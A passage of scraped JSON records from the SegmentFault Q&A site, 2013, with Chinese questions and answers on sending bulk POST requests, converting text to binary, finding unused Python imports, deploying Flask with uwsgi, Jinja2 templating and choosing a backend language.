      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000175772\">\n<p>有轮子的时候用轮子 ... 没有轮子的时候就自己造一个轮子好了 ...</p><p>好吧其实我就是突然有一点点闲时间可以帮你写写代码这样 ...</p><pre>&lt;?php\n/* put your text file location here ... */\ndefine( 'TEXT_SRC', '/path/to/your.text.file.txt' );\n\n/* put the url which you wanna post data to here ... */\ndefine( 'DATA_URL', 'http://the.url.data/goes.to' );\n\n/* put post field name here ... */\ndefine( 'POST_PFX', 'data' );\n\n/* read million data from source ... */\n$text_src = file( \n    TEXT_SRC, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES \n    );\n\n/* hey here comes cURL ... */\n$curl = curl_init();\n\n/* prepare cURL and make a very fashion UA header ... */\ncurl_setopt_array( $curl, [\n    CURLOPT_URL             =&gt;  DATA_URL, \n    CURLOPT_USERAGENT       =&gt;  \n        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',\n    CURLOPT_RETURNTRANSFER  =&gt;  1, \n    CURLOPT_POST            =&gt;  1, \n    ] );\n\n/* something to handle cURL result ... */\n$callback = function( $result ) {\n    return;\n};\n\n/* time for our BIG LOOOOOOOP ! */\nforeach( $text_src as $data ) {\n\n    /* fill data ... */\n    curl_setopt( $curl, CURLOPT_POSTFIELDS, POST_PFX . '=' . $data );\n\n    /* and send them out ! */\n    $callback( curl_exec( $curl ) );\n\n}\n\n/* you have had a long flight ... time for rest ... */\ncurl_close( $curl );  </pre><p>运行的话需要 php 5.4.0 以上的版本和 cURL 扩展 ... 前三行是配置区需要自行修改 ...</p><p>另外程序是以牺牲内存为代价提升效率的 ... 因为我觉得说只有几十万行的话应该文件不会太大 ...</p><p>程序会把那个文本文档一股脑读进内存 ... 所以如果要处理更多数据的话还要修改 ...</p><p>恩 ... 就是这样 ... 看看是不是你想要的效果呢 ..?</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000175841\">\n<p>这种事情太适合用PYTHON来实现了。简单的代码如下：</p><pre>text = open(\"__init__.py\")\nimport urllib\nwhile True:\n    line = text.readline()\n    if not line:\n        break\n    params = urllib.urlencode({'arg': line})\n    f = urllib.urlopen(\"http://UrUrl\", params)\n    print f.read()\ntext.close()</pre><p>如果需要的话还可以加入连接超时然后重新发起请求，还可以使用多线程来减少整个的时间。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000176042\">\n<p>一个写的比一个短你们这是逼我啊 ... 要比拼 Hello World 么 ..?</p><pre>awk '{ system( \"curl -d \\\"data=\" $0 \"\\\" http://url\" ) }' file.txt</pre><p>awk 单行搞定 ...</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000175663\">\n<p>有个几十万行的文本文件，里面逐行有一些信息<br/>\n有没有什么工具可以给某个url批量按照文本文件一行行发post请求呢？<br/>\n求具体说明</p>\n</div>",
      "favourite": "8",
      "glance": "6.9k",
      "tags": [
        "python",
        "php",
        "http",
        "web"
      ],
      "time": "2013-03-04",
      "title": "有没有什么工具可以给某url批量发post请求？",
      "url": "https://segmentfault.com/q/1010000000175663"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000177585\">\n<pre>import binascii\nwith open ( \"regular_english_file.txt\", \"r\" ) as myfile:\n    print bin( int( binascii.hexlify( myfile.read() ), 16 ) );</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000736648\">\n<p>其实这个问题很简单  open('your.txt', 'rb') 以二进制的mode打开不就行了吗？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000178020\">\n<p>英文就是ascii编码嘛！</p><p><code>ord(num)</code>显示字符的编码。</p><p>然后转化编码为二进制数不就可以了。</p><p>为了美化，可以每个数值添加几个零成为8位二进制数，作为一个byte，空格隔开。</p><p>python自建有<code>bin()</code>函数，可是返回的字符是以'0b'开头 # '0b000110'</p><p>可以使用下面的函数转换</p><pre> \nbin = lambda n : (n &gt; 0) and (bin(n/2) + str(n%2)) or '' \nbin(2)  # 10</pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000177556\">\n<p>密码学作业需要，要将普通的英文txt文档转化成01组成的文本。</p>\n</div>",
      "favourite": "2",
      "glance": "4k",
      "tags": [
        "python"
      ],
      "time": "2013-03-11",
      "title": "Python有什么模块可以将文本文件转化成二进制文件？",
      "url": "https://segmentfault.com/q/1010000000177556"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000181229\">\n<p>想开发一个支持局域网内多人语音的网站<br/>\n（局域网内一个节点当主机，只是供内部人员使用，不需要考虑外网）<br/>\nnode.js、php、python等皆可<br/>\n可惜是个小白，没有什么头绪，请各位大神给条思路！！！</p>\n</div>",
      "favourite": "1",
      "glance": "2.8k",
      "tags": [
        "语音",
        "web",
        "node.js",
        "python",
        "php"
      ],
      "time": "2013-03-21",
      "title": "局域网在线多人语音网站",
      "url": "https://segmentfault.com/q/1010000000181229"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000182052\">\n<p>最近迷上了玩python challenge，就想写个能实现如题功能的玩意，无奈脑袋不够用。。。</p><p>另，希望能够以一个图片为例，再将字符串转回原来原来的图片。多谢！</p><p>(另，最好是python，不过java\\c\\c++都可以)</p>\n</div>",
      "favourite": "5",
      "glance": "4.8k",
      "tags": [
        "python",
        "加密解密"
      ],
      "time": "2013-03-23",
      "title": "如何用python把任意文件转换为“1010”样子的文本",
      "url": "https://segmentfault.com/q/1010000000182052"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000185050\">\n<p>正如楼上所提到的，楼主想要干的事情，在程序静态分析中，被称为DCE（无用代码的删除）。自己实现一个也不是不可以，不过如果急用的话就不太合适了。</p><p>现成的插件/库也是有很多的。我用过一段时间的pyflakes，它是一个代码检查插件，不仅可以满足楼主的要求，还有更多的功能。以楼主的代码为例，</p><pre>$ echo \"from a import b\" &gt; test.py\n$ pyflakes test.py\ntest.py:1: 'b' imported but unused</pre><p>大概就是这样。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000185225\">\n<p>python有个代码检查工具，pyflake，还可以集成到vim，在vim中用cc检查</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000184820\">\n<p>假定你的代码中都没有直接从locals()/globals()中获取b的引用，那这还是比较容易的，下面给你举个例子吧。</p><p>比如这段代码:</p><pre>from a import b\nb</pre><p>你可以用python的compiler模块去解析它:</p><pre>import compiler\ncompiler.parse('from a import b\\nb')</pre><p>得到的输出为这段代码的AST(abstract syntax tree)</p><blockquote>Module(None, Stmt([From('a', [('b', None)], 0), Discard(Name('b'))]))</blockquote><p>有了AST，你就可以很容易地去处理它了，为了更简单一点，可以这样：</p><pre>import parser\nst = parser.suite('from a import b\\nb')\nprint parser.st2list(st)</pre><p>输出是：</p><blockquote>[257, [267, [268, [269, [281, [283, [1, \"from\"], [288, [1, \"a\"]], [1, \"import\"], [286, [284, [1, \"b\"]]]]]], [4, \"\"]]], [267, [268, [269, [270, [327, [304, [305, [306, [307, [308, [310, [311, [312, [313, [314, [315, [316, [317, [318, [1, \"b\"]]]]]]]]]]]]]]]]]], [4, \"\"]], [0, \"\"]]</blockquote><p>这就是一棵用list构成的树了，你要做的事情就是先序遍历，遍历的过程中用一个dict保存所有被import的name，遇到引用name的时候，记录它是否出现过，最后输出dict中没有出现过的name即可。</p><p>另外，如果有这样的情况:</p><pre>from a import b\nb = 123 #后续对b的引用与import的b无关</pre><p>你也可以特殊处理一下赋值操作，检查被赋值的name<code>是否在dict中且没有被引用过</code>，如果是，输出它，从dict里删除，然后继续。</p><p><strong>EDIT</strong><br/>\n补充一下，有以下这些import语句需要考虑：<br/>\n//from Python/Include/graminit.h</p><pre>#define import_stmt 281\n#define import_name 282\n#define import_from 283\n#define import_as_name 284\n#define import_as_names 286</pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000184792\">\n<p>例：</p><pre>from a import b\n\n# 下面的操作没用到b</pre><p>如何找出所有这种情况？</p>\n</div>",
      "favourite": "2",
      "glance": "3.1k",
      "tags": [
        "python"
      ],
      "time": "2013-04-02",
      "title": "如何查找python代码中所有未使用到的from与import的类库",
      "url": "https://segmentfault.com/q/1010000000184792"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000185964\">\n<p>想做一个爬虫，使用BeautifulSoup假使获取以下内容：</p><pre>&lt;div class=\"authi\"&gt;\n&lt;img class=\"authicn vm\" id=\"\" src=\"static/image/common/online_member.gif\" /&gt;\n&lt;em id=\"\"&gt;发表于 &lt;span title=\"2013-4-2 08:30:11\"&gt;4&amp;nbsp;天前&lt;/span&gt;&lt;/em&gt;\n&lt;span class=\"pipe\"&gt;|&lt;/span&gt;&lt;a href=&gt;倒序浏览&lt;/a&gt;\n&lt;div style=\"float:right;position:relative;top:-6px;\"&gt;&lt;ul&gt;\n&lt;li style=\"float: left; width: 130px; height: 24px;\"&gt;&lt;wb:follow-button uid=\"\" type=\"gray_2\" width=\"136\" height=\"24\"&gt;&lt;/wb:follow-button&gt;&lt;/li&gt;\n&lt;li style=\" float:left; width: 160px; height: 24px;\"&gt;&lt;/li&gt;\n&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;</pre><p>如何获取以上内容中的2013-4-2 08:30:11这个时间呢？<br/>\n我试着写了一个</p><pre>re.compile('^20\\d{2}-\\d+-\\d+\\s\\d{2}:\\d{2}:\\d{2}')</pre><p>可是这个在使用的时候不能匹配到时间？如何解决？谢谢！</p>\n</div>",
      "favourite": "1",
      "glance": "4.1k",
      "tags": [
        "python"
      ],
      "time": "2013-04-06",
      "title": "python使用正则获取html中的时间",
      "url": "https://segmentfault.com/q/1010000000185964"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000186361\">\n<p>框架基本上都是触类旁通的。<br/>\n我直接入手Django的时候，发现有一堆东西要配置经常出错。<br/>\n后来我选择了从简单的Flask入手，慢慢的将其壮大。现在再回过头来看Django，就发现简单很多啦。<br/>\n所以，我推崇从简单的入手。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000189913\">\n<p>lz 我昨天拼了一个出来，你看下：\n<a href=\"https://gitcafe.com/shiweifu/hiweb\" rel=\"nofollow\">https://gitcafe.com/shiweifu/hiweb</a></p>\n<ul>\n<li>模板支持</li>\n<li>使用装饰器进行URL 路由</li>\n<li>支持cookie</li>\n</ul>\n<p>只是在wsgi 上薄薄封了一层，代码也很好理解</p>\n<p>推荐你两个学习资源：\n<a href=\"http://lucumr.pocoo.org/2007/5/21/getting-started-with-wsgi/\" rel=\"nofollow\">http://lucumr.pocoo.org/2007/5/21/getting-started-with-wsgi/</a>\n<a href=\"http://lukearno.com/projects/\" rel=\"nofollow\">http://lukearno.com/projects/</a></p>\n<p>对Web Server/CGI 有一些了解，再看看pep 333就差不多了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000186381\">\n<blockquote><br/><br/>web框架学习列表 <a href=\"http://lutaf.com/148.htm\" rel=\"nofollow\" target=\"_blank\" title=\"http://lutaf.com/148.htm\">http://lutaf.com/148.htm</a></blockquote><p>如何定义 url route<br/>\n如何组织 request handler 函数<br/>\n如何部部署app 程序<br/>\n如何访问数据库(是否支持ORM?)<br/>\n如何使用模板系统</p><p>初学者的话,推荐@limodou的Uliweb <a href=\"http://limodou.github.io/uliweb-doc/index.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://limodou.github.io/uliweb-doc/i...\">http://limodou.github.io/uliweb-doc/i...</a><br/>\n你可以在UliwebQQ群里问@limodou Uliweb相关的技术问题,他很乐意回答的.  :-)<br/>\n<a href=\"http://uliweb.clkg.org/tutorial/read/22\" rel=\"nofollow\" target=\"_blank\" title=\"http://uliweb.clkg.org/tutorial/read/...\">http://uliweb.clkg.org/tutorial/read/...</a></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000186319\">\n<p>框架太多了：</p><p><a href=\"http://wiki.python.org/moin/WebFrameworks\" rel=\"nofollow\" target=\"_blank\" title=\"http://wiki.python.org/moin/WebFramew...\">http://wiki.python.org/moin/WebFramew...</a></p><p>几乎每一种都有自己的特色，根据需求选框架的思路没错，但综合对比，有融会贯通的方法吗？</p><p>有多少人会（或精通）很多种框架呢？这是要一个一个练习才能达到的吗？</p><p>PHP框架也多，一个问题；Ruby较少，好把握。</p>\n</div>",
      "favourite": "10",
      "glance": "3.2k",
      "tags": [
        "python",
        "php",
        "ruby"
      ],
      "time": "2013-04-08",
      "title": "python 框架繁多，如何整体把握？",
      "url": "https://segmentfault.com/q/1010000000186319"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000190277\">\n<html><body>\n<p>问题背景：\n    Python在执行的时候会加载每一个模块的PyCodeObject,其中这个对象就包含有opcode,也就是这个模块所有的指令集合，具体定义在源码目录的 /include/opcode.h 中定义了所有的指令集合，在执行的时候通过加载opcode完成指令的流水线执行过程，opcode也就是所有指令集合生成的字符串。执行体位于源码目录的 /Python/ceavl.c 中PyEval_EvalFrameEx()函数就是虚拟机的执行体函数，它会加载指令集合并完成运算。</p>\n<p>问题描述：\n    在PyEval_EvalFrameEx()函数中，同样是通过标准状态机模型完成的指令解析，一个巨大无比的switch结构，类似这样：\n<img data-src=\"http://segmentfault.com/img/bVXE2\"/></p>\n<p><em>在C中,switch语句的执行是逐条对比的，也就是说每一条指令在执行的时候都需要从头对比，因为这里的指令集合是不平均分布的，但是我们可以假设每个指令平均需要匹配n次，n &gt; 1,其实是远远大于1的。</em></p>\n<p>具体问题：\n    是否可以做优化，为什么作者没有做优化? 如果不采用switch状态机，因为指令码也是有编号的，是否可以直接采用类hashtable的形式来做?</p>\n<p>附注：\n    如果此问题很2请亲提出宝贵的意见</p>\n</body></html>\n</div>",
      "favourite": "3",
      "glance": "2.5k",
      "tags": [
        "python"
      ],
      "time": "2013-04-18",
      "title": "Python 字节码优化问题",
      "url": "https://segmentfault.com/q/1010000000190277"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000193525\">\n<p>site1，site2和site3使用各自的virtualenv环境运行，site1为django app，site2与site3同为flask app且配置基本相同，最终结果是site1和site2运行正常，site3不正常，检查supervisor日志应该是site3的uwsgi进程起不来，不知道为什么，花了一个晚上了还是找不出问原因，谁有空帮忙看下，感谢</p>\n<p>supervisor的日志如下</p>\n<pre><code>2013-04-24 22:36:47,316 INFO success: site1 entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)\n2013-04-24 22:36:47,316 INFO success: site2 entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)\n2013-04-24 22:36:47,317 INFO spawned: 'site3' with pid 14559\n2013-04-24 22:36:47,327 INFO exited: site3 (exit status 1; not expected)\n2013-04-24 22:36:49,331 INFO spawned: 'site3' with pid 14564\n2013-04-24 22:36:49,339 INFO exited: site3 (exit status 1; not expected)\n2013-04-24 22:36:52,343 INFO spawned: 'site3' with pid 14566\n2013-04-24 22:36:52,351 INFO exited: site3 (exit status 1; not expected)\n2013-04-24 22:36:53,352 INFO gave up: site3 entered FATAL state, too many start retries too quickly\n</code></pre>\n<p>site3的uwsgi日志如下</p>\n<pre><code>unable to load configuration from 666\nunable to load configuration from 666\nunable to load configuration from 666\nunable to load configuration from 666\n</code></pre>\n<p>site3 nginx配置</p>\n<pre><code>server {\n    listen 80;\n    server_name site3.site2.com;\n    access_log /var/log/nginx/site3.site2.com.access.log;\n    error_log /var/log/nginx/site3.site2.com.error.log;\n    location /\n    {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi_site3.sock;\n    }\n    location ~ /\\.    { access_log off; log_not_found off; deny all; }\n    location ~ ~$     { access_log off; log_not_found off; deny all; }\n}\n</code></pre>\n<p>site2 nginx配置</p>\n<pre><code>server {\n    listen 80;\n    server_name site2.com www.site2.com;\n    access_log /var/log/nginx/site2.com.access.log;\n    error_log /var/log/nginx/site2.com.error.log;\n    location /\n    {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi_site2.sock;\n    }\n    location ~ /\\.    { access_log off; log_not_found off; deny all; }\n    location ~ ~$     { access_log off; log_not_found off; deny all; }\n}\n</code></pre>\n<p>supervisor配置</p>\n<pre><code>[program:site2]\ncommand=/home/user/workspace/venvs/site2/env/bin/uwsgi -s /tmp/uwsgi_site2.sock -w runserver:app -H /home/user/workspace/venvs/site2/env --chmod-socket 666\ndirectory=/home/user/workspace/venvs/site2\nautostart=true\nautorestart=true\nstdout_logfile=/home/user/workspace/venvs/site2/uwsgi.log\nredirect_stderr=true\nstopsignal=QUIT\n\n[program:site1]\ncommand=/home/user/workspace/venvs/site1/env/bin/uwsgi -s /tmp/uwsgi_site1.sock -w wsgi:application -H /home/user/workspace/venvs/site1/env --chmod-socket 666\ndirectory=/home/user/workspace/venvs/site1\nautostart=true\nautorestart=true\nstdout_logfile=/home/user/workspace/venvs/site1/uwsgi.log\nredirect_stderr=true\nstopsignal=QUIT\n\n[program:site3]\ncommand=/home/user/workspace/venvs/site3/env/bin/uwsgi -s /tmp/uwsgi_site3.sock -w runserver:app -H /home/user/workspace/venvs/site3/env --chmod-socket 666\ndirectory=/home/user/workspace/venvs/site3\nautostart=true\nautorestart=true\nstdout_logfile=/home/user/workspace/venvs/site3/uwsgi.log\nredirect_stderr=true\nstopsignal=QUIT\n</code></pre>\n<p>site2 app</p>\n<pre><code>from site2 import app\nfrom site2.database import init_db\n\ntry:\n    init_db()\nexcept:\n    pass\n\nif __name__ == '__main__':\n    app.run()\n</code></pre>\n<p>site3 app</p>\n<pre><code>from site3 import app\nfrom site3.database import init_db, init_testdata, test_db\n\nif __name__ == '__main__':\n    init_db()\n    init_testdata()\n    test_db()\n    app.run()\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "8.6k",
      "tags": [
        "supervisor",
        "uwsgi",
        "python",
        "nginx",
        "flask"
      ],
      "time": "2013-04-24",
      "title": "用nginx+uwsgi+python+flask/django部署3个web，使用supervisor监控管理uwsgi进程，2个正常另1个无法启动uwsgi进程",
      "url": "https://segmentfault.com/q/1010000000193525"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000204620\">\n<p>这两个函数用于将值转为字符串，前者转为适合人阅读的形式，后者转为供解释器读取的形式\n那么怎么算是适合人阅读的形式，怎么算是供解释器读取的形式呢?这两者有何不同？</p>\n</div>",
      "favourite": "3",
      "glance": "1.8k",
      "tags": [
        "python"
      ],
      "time": "2013-05-24",
      "title": "关于python里的str和repr",
      "url": "https://segmentfault.com/q/1010000000204620"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000207074\">\n<p>按我的建议，学什么语言不重要，重要的是你学语言想干什么？比如做网站？开发安卓app，等等。明确一个自己感兴趣的目标之后，在选择语言，以兴趣引导语言，学习才有动力。比如做网站，那可能就是php,nodejs，做个简单的blog，在实践中慢慢了解语言，在学习中慢慢成长。</p>\n<p>如果你学会了其中的一个，然后在去了解其它的，可以说，入门会很快，因为里边有很多相同的东西。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000206805\">\n<p>梦想无用论者表示，最重要的事情是，马上挑一门语言开始学，多实践，自然会找到接近best practise的路。不要期望一门语言能解决所有问题，尤其是“后端技术”这么宽泛的概念。你现在需要的只是一个能解决手头问题的语言，鉴于你现在是零基础，那么你提到的任何一个语言，必然都能解决你现在的问题。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000207260\">\n<p>对于，学过，java，php，python，nodejs 的人来简单说说怎么选择。</p>\n<p>java\n首先，你一定不要用myeclipse进行java web的学习，这样，会让你永远不明白什么java web里面的jsr 规范。作为一个有志向的程序猿，深入到规范的标准时必须的。其次，就是至少掌握一门包管理工具（maven，ivy,gradle），这样会让你学习开源项目的时候得心应手。</p>\n<p>优点：可靠的大型解决方案多，速度快（告诉你一个事实，java作为后端语言的性能在各种评测里面都是名列前茅的，不过对于新手而言的感观的慢这点要改过了确实不容易）。\n缺点：概念多，包管理工具不易上手。</p>\n<p>php\n简单，好用开源成熟的东西多，至于你朋友说php是上一个世纪的东西，我告诉你，现在流行的技术都是上一个世纪的（java，python,javascript）</p>\n<p>优点：上手快，学习资料多。\n缺点：php5和php6 不兼容，速度慢（这个问题，在你还没有精通php之前，请暂时不要考虑），一般只能用来开发web。</p>\n<p>python\n优雅，简洁，好看，前后端通杀。由于我只是两年前有个开源项目用到了python，然后，那个项目结束以后也没怎么接触python了，所以，这里的评价可能不太正确。</p>\n<p>优点：能用的开源项目多，学习门槛不高。\n缺点：py3和py2不支持。对win 不友好，缩进的编程，可能会由于文件编码导致项目崩溃。</p>\n<p>nodejs\n单线程，事件异步驱动模型，通杀网络层，传输层，还可以进行嵌入式的开发（对于跑v8 的js 而言，性能杠杠的，已经有不少人用nodejs + 树莓派开发出各种好玩的东西）</p>\n<p>优点：活跃的国外社区，为人民服务的作者众多，强力的github支持（这里不是说nodejs本身，而是nodejs整个模块的生态，一般模块的作者都会回复你的issue，这点心有体会，没有什么东西比把问题交给别人解决最好的了。。。），\n缺点：很多模块并不成熟，中文资料不多，过时。国内社区不活跃，喷子很多（主要喷node的性能比php还差我补充一下，大部分（注意是大部分，不是全部，喷的时候不要瞎喷）的评测都毫秒杀php（<a href=\"http://www.techempower.com/benchmarks/\" rel=\"nofollow\">http://www.techempower.com/benchmarks/</a>），还有就是js作为编程语言的不成熟，关于这点，你去好好翻一下 es5标准（v8的实现的就是es5标准）再来开喷。），所以，要学node，你的英语起码要有初中生的水平，用于方便阅读英语资料和与老外交流。还有就是，不是很人类的callback 编程风格。不过我很喜欢。。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000206748\">\n<p>我后端基础为零，怎么学好Node.js呢？有很多朋友说，PHP已经是上个世界的了，真的假的哈？作为初入移动互联网界的小弟级中小弟级，求大神指导。就我所知道的后端，好似还有Python、Ruby、Scala等等。好纠结哈、好纠结，学哪个好呢？话说是不是应该把这个同时也贴到知乎上面去呢？我想我是一定会做这件事情的，同时。\n求大牛+大神+码神，以前瞻性的眼光指点迷津一下下。</p>\n<p>——我会同时自己不断回答我的问题，因为见证着自己的成长，成为牛掰程序员，改变世界，是梦想！更要是不多年数后的，那真真实实的生活状态。</p>\n<p>——新浪微博：@夏力维</p>\n</div>",
      "favourite": "4",
      "glance": "12k",
      "tags": [
        "php",
        "node.js",
        "python",
        "程序员"
      ],
      "time": "2013-05-30",
      "title": "后端零起步：学哪一种比较好？",
      "url": "https://segmentfault.com/q/1010000000206748"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000209647\">\n<p>很多语言里都有这个特性，但不知先后顺序与发展历史，很想了解一下。</p>\n</div>",
      "favourite": "1",
      "glance": "2k",
      "tags": [
        "javascript",
        "scala",
        "php",
        "ruby",
        "python"
      ],
      "time": "2013-06-05",
      "title": "闭包是在哪个语言里最先出现的？能讲一下历史吗？",
      "url": "https://segmentfault.com/q/1010000000209647"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000212932\">\n<p>正在想用python来实现一个HDR滤镜，但是找了很多算法跟程序，都发现效率比较低，有比较好的实现方式么？</p>\n</div>",
      "favourite": "1",
      "glance": "1.4k",
      "tags": [
        "python"
      ],
      "time": "2013-06-13",
      "title": "python 实现HDR效果",
      "url": "https://segmentfault.com/q/1010000000212932"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000247329\">\n<p>如果在 Jinja2 中输出空变量</p>\n<pre><code>{{ some_none_value }}\n</code></pre>\n<p>如果值是 <code>None</code> ，页面中输出的也是 <code>None</code></p>\n<p>类似：</p>\n<pre><code>电子邮件：348189477@qq.com  \n座右铭：None  \n个人介绍：None  \n注册日期：2013-06-24 23:53  \n</code></pre>\n<p>有没有什么办法能够全局配置使之统一输出空字符串？</p>\n<p>因为使用类似 <code>{{ some_value | default('') }}</code> 的方式太麻烦，所以希望能够通过全局解决。</p>\n</div>",
      "favourite": "2",
      "glance": "3k",
      "tags": [
        "python",
        "jinja2"
      ],
      "time": "2013-06-25",
      "title": "Jinja2 如何默认将 None 值显示为空字符串？",
      "url": "https://segmentfault.com/q/1010000000247329"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000248634\">\n<p>最近在折腾python web的flask，碰到如下问题：\n我有一个template叫index.html, 在body中包含如下内容</p>\n<pre><code class=\"lang-html\"> &lt;div class=\"span9\" id=\"news_loadding\"&gt;\n     {% for item in news %} \n       &lt;div class=\"weibo-text\"&gt;{{ item['description'] }}&lt;/div&gt;\n     {% endfor %} \n&lt;/div&gt;\n\n</code></pre>\n<p>现在变量{{ item['description'] }}的内容如下</p>\n<pre><code class=\"lang-python\">现任&lt;font color=\"RED\"&gt;澳洲&lt;/font&gt;总理吉拉德在澳大利亚工党领袖选举中输给陆克文。&lt;br /&gt;\n</code></pre>\n<p>如何插入该变量的内容后，html正常解析这些标签？？向大家求教\n目前，{{ item['description'] }}的内容直接显示在页面上，也就是说<code>&lt;font..., &lt;br/&gt;</code>这些HTML标签原原本本的显示出来了，而没有解析。</p>\n</div>",
      "favourite": "1",
      "glance": "4.3k",
      "tags": [
        "html",
        "python",
        "flask"
      ],
      "time": "2013-06-26",
      "title": "如何在网页中插入一段包含html标签的内容，并且正常显示",
      "url": "https://segmentfault.com/q/1010000000248634"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000262795\">\n<p>目前在做视频流播放效果模拟的研究，想要在本地模拟一种情况，就是多个client同时请求播放，然后在服务器带宽一定的情况下，多个client相互间影响其他client的传输效率。</p>\n<p>因为自己暂时没有好的明确的思路，可能也没法解释的太清楚，不过还是想来求教一下！</p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "server",
        "python"
      ],
      "time": "2013-08-08",
      "title": "如何模拟两个或多个client对网络带宽进行竞争的状况",
      "url": "https://segmentfault.com/q/1010000000262795"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000307633\">\n<p>代码在这里：<a href=\"http://pastebin.com/mdizARWA\" rel=\"nofollow\">http://pastebin.com/mdizARWA</a>\n现在的问题是：插入数据库的全是乱码\n采集到的数据是gbk的，插入数据库的时候要转成utf8的，试过decode encode各种模式，都无法解决乱码的问题，文件的编码是utf-8 无bom的。</p>\n<p>问题已经解决：\n用requests抓取到网页内容，会自动分析编码，再交给pyquery处理</p>\n</div>",
      "favourite": "0",
      "glance": "1.8k",
      "tags": [
        "python"
      ],
      "time": "2013-09-13",
      "title": "python pyquery 采集淘宝的编码问题",
      "url": "https://segmentfault.com/q/1010000000307633"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000312251\">\n<html><body>\n<p><img data-src=\"http://segmentfault.com/img/bVbtoq\"/></p>\n<p>想问下这样的邮件提示 就是后台利用邮件服务发送的html页面吗？是不是其中的静态文件都要链到segmentfault服务器 还是可以生成好之后一起发送 我用抓包工具看了没有发现对静态文件的请求 想请问下做这个邮件页面要如何做</p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "python",
        "django",
        "tornado",
        "flask",
        "segmentfault"
      ],
      "time": "2013-09-24",
      "title": "segmentfault这样额邮件提示是怎么做到的 就是普通的html设计吗",
      "url": "https://segmentfault.com/q/1010000000312251"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000313466\">\n<p>今天遇到一个没见过的代码：</p>\n<pre><code>class Iface:\n  def ping(self, ):                                                                                                                                                                      \n    pass                                                                                                                                                                                 \n\n  def say(self, msg):                                                                                                                                                                    \n    \"\"\"\n    Parameters:                                                                                                                                                                          \n     - msg                                                                                                                                                                               \n    \"\"\"\n    pass                                                                                                                                                                                 \n</code></pre>\n<p>这里ping()的参数是以逗号结尾，是指参数为有一个元素的元组吗？  </p>\n</div>",
      "favourite": "1",
      "glance": "2.8k",
      "tags": [
        "python"
      ],
      "time": "2013-09-27",
      "title": "python 类成员函数的参数问题",
      "url": "https://segmentfault.com/q/1010000000313466"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000317239\">\n<p><a href=\"http://docs.python.org/2/whatsnew/2.7.html\" rel=\"nofollow\">What’s New in Python 2.7</a></p>\n<p><a href=\"http://hg.python.org/cpython/file/ab05e7dd2788/Misc/NEWS\" rel=\"nofollow\">Change Log</a></p>\n</div>",
